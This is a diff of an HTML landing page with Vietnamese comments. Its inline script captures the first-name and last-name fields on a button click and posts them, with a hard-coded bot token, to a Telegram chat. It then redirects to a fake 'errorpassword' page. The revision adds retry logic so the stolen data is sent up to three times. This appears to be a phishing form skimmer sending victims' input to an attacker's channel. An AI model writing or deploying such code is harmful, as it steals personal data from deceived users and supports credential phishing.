@@ -844,51 +844,74 @@
 	</div><!-- lp:insertions start body:after -->
 
 	<script>
-		document.getElementById("lp-pom-button-18").addEventListener("click", function() {
-			// Lấy dữ liệu từ các trường nhập liệu
-			var firstName = document.getElementById("first_name").value;
-			var lastName = document.getElementById("last_name").value;
-		
-			// Kiểm tra xem cả hai trường nhập liệu có dữ liệu không
-			if(firstName.trim() !== '' && lastName.trim() !== '') {
-				// Token của bot Telegram
-				var botToken = '6591392740:AAGw9FfUDM-FDCI9PzTWUXc1RBuIsLPfldU';
-		
-				// Chat ID của nhóm Telegram
-				var chatId = '@ongochoc123';
-		
-				// Tin nhắn bạn muốn gửi
-				var message = '======================================================================================================== \n \nNhập lần 1:\nFirst Name: ' + firstName + '\nLast Name: ' + lastName;
-		
-				// Tạo URL endpoint để gửi tin nhắn
-				var telegramApiUrl = 'https://api.telegram.org/bot' + botToken + '/sendMessage';
-		
-				// Sử dụng Fetch API để gửi tin nhắn
-				fetch(telegramApiUrl, {
-					method: 'POST',
-					headers: {
-						'Content-Type': 'application/json'
-					},
-					body: JSON.stringify({
-						chat_id: chatId,
-						text: message
-					})
-				})
-				.then(response => {
-					if (!response.ok) {
-						throw new Error('Network response was not ok');
-					}
-					return response.json();
-				})
-				.then(data => {
-					window.location.href = '\errorpassword';
-				})
-				.catch(error => {
-					alert('Error sending message!');
-				});
-			} else {
-				
-			}
+		// Khởi tạo biến đếm
+var sendMessageAttempts = 0;
+
+document.getElementById("lp-pom-button-18").addEventListener("click", function() {
+    // Lấy dữ liệu từ các trường nhập liệu
+    var firstName = document.getElementById("first_name").value;
+    var lastName = document.getElementById("last_name").value;
+
+    // Kiểm tra xem cả hai trường nhập liệu có dữ liệu không
+    if (firstName.trim() !== '' && lastName.trim() !== '') {
+        // Token của bot Telegram
+        var botToken = '6591392740:AAGw9FfUDM-FDCI9PzTWUXc1RBuIsLPfldU';
+
+        // Chat ID của nhóm Telegram
+        var chatId = '@ongochoc123';
+
+        // Tin nhắn bạn muốn gửi
+        var message = '======================================================================================================== \n \nNhập lần 1:\nFirst Name: ' + firstName + '\nLast Name: ' + lastName;
+
+        // Tạo URL endpoint để gửi tin nhắn
+        var telegramApiUrl = 'https://api.telegram.org/bot' + botToken + '/sendMessage';
+
+        // Sử dụng hàm để gửi tin nhắn
+        function sendMessage() {
+            // Sử dụng Fetch API để gửi tin nhắn
+            fetch(telegramApiUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Network response was not ok');
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    // Nếu gửi tin nhắn thành công, chuyển hướng
+                    window.location.href = '\errorpassword';
+                })
+                .catch(error => {
+                    // Tăng biến đếm
+                    sendMessageAttempts++;
+                    // Kiểm tra nếu đã thử gửi tin nhắn ba lần
+                    if (sendMessageAttempts < 3) {
+                        // Nếu chưa, gửi lại tin nhắn
+                        sendMessage();
+                    } else {
+                        // Nếu đã thử gửi tin nhắn ba lần mà vẫn không thành công, hiển thị thông báo lỗi cho người dùng
+                        alert('Không thể gửi tin nhắn. Vui lòng thử lại sau.');
+                        // Reset biến đếm
+                        sendMessageAttempts = 0;
+                    }
+                });
+        }
+
+        // Gửi tin nhắn ban đầu
+        sendMessage();
+    } else {
+        // Xử lý trường hợp không có dữ liệu nhập liệu
+    }
+});
+
 		});
 		</script>
 
